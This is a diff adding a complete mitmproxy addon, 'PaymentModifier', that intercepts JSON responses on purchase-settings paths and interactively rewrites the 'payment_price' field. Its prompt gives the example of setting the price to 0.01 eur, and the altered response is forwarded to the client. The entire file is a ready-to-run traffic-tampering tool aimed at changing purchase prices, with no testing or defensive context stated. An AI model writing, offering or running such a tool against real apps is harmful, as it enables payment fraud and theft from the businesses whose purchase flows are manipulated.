@@ -1,0 +1,133 @@
+import json
+from mitmproxy import http, ctx, addons
+
+class PaymentModifier:
+    def __init__(self):
+        self.intercepted_once = False
+
+    def load(self, loader):
+        loader.add_option(
+            name="target_host",
+            typespec=str,
+            default="",
+            help="Only intercept requests to this host (optional).",
+        )
+        loader.add_option(
+            name="target_path_substr",
+            typespec=str,
+            default="purchase_settings",
+            help="Substring that must be present in the request path to intercept.",
+        )
+        loader.add_option(
+            name="json_key",
+            typespec=str,
+            default="payment_price",
+            help="JSON key in the response to modify.",
+        )
+        loader.add_option(
+            name="intercept_once",
+            typespec=bool,
+            default=True,
+            help="If true, only intercept the first matching response.",
+        )
+
+    def response(self, flow: http.HTTPFlow) -> None:
+        # Host filter
+        target_host = ctx.options.target_host.strip()
+        if target_host and flow.request.host != target_host:
+            return
+
+        # Path filter
+        if ctx.options.target_path_substr not in flow.request.path:
+            return
+
+        # Already intercepted?
+        if ctx.options.intercept_once and self.intercepted_once:
+            return
+
+        # Content-Type must be JSON-like
+        content_type = flow.response.headers.get("content-type", "").lower()
+        if "application/json" not in content_type and \
+           not flow.response.text.strip().startswith("{"):
+            return
+
+        try:
+            data = json.loads(flow.response.get_text())
+        except Exception as e:
+            ctx.log.warn(f"Failed to parse JSON: {e}")
+            return
+
+        key = ctx.options.json_key
+        # Find all occurrences of the key, deep (dicts and lists)
+        matches = []  # list of tuples: (path_list, parent_container, key_or_index)
+        def walk(node, path):
+            if isinstance(node, dict):
+                for k, v in node.items():
+                    if k == key:
+                        matches.append((path + [k], node, k))
+                    walk(v, path + [k])
+            elif isinstance(node, list):
+                for idx, item in enumerate(node):
+                    walk(item, path + [idx])
+
+        walk(data, [])
+
+        if not matches:
+            return
+
+        # If multiple matches, let user choose
+        chosen_idx = 0
+        if len(matches) > 1:
+            print("\nMultiple occurrences found for key:", key)
+            for i, (p, parent, k_or_i) in enumerate(matches):
+                try:
+                    current_val = parent[k_or_i]
+                except Exception:
+                    current_val = "<unreadable>"
+                print(f"[{i}] path={self._fmt_path(p)}\n    value={json.dumps(current_val, ensure_ascii=False)}")
+            raw = input("Select index to edit (default 0): ").strip()
+            if raw.isdigit():
+                chosen_idx = max(0, min(int(raw), len(matches)-1))
+
+        path, parent, key_or_index = matches[chosen_idx]
+        parent[key_or_index] = self._prompt_edit(parent[key_or_index], label=self._fmt_path(path))
+
+        # Update response with modified data
+        flow.response.text = json.dumps(data)
+        flow.response.headers["content-length"] = str(len(flow.response.text.encode("utf-8")))
+        self.intercepted_once = True
+        ctx.log.info("Response modified and forwarded.")
+
+    def _prompt_edit(self, obj, label: str):
+        ctx.log.info("=== Intercepted response. Allowing manual edit. ===")
+        print("\n==============================")
+        print(f"Editing field: {label}")
+        print("Current value:")
+        print(json.dumps(obj, indent=2, ensure_ascii=False))
+        print("------------------------------")
+        print("Instructions:")
+        print("- Press Enter to accept current value")
+        print("- Or paste new JSON for this field (e.g., {\"price\":0.01,\"currency\":\"eur\"})")
+        print("==============================\n")
+        user_input = input("New JSON (blank to keep): ").strip()
+        if not user_input:
+            return obj
+        try:
+            new_obj = json.loads(user_input)
+            return new_obj
+        except Exception as e:
+            print(f"Invalid JSON, keeping original. Error: {e}")
+            return obj
+
+    def _fmt_path(self, path_list):
+        out = []
+        for p in path_list:
+            if isinstance(p, int):
+                out.append(f"[{p}]")
+            else:
+                if out:
+                    out.append(".")
+                out.append(p)
+        return "".join(out)
+
+addons = [PaymentModifier()]
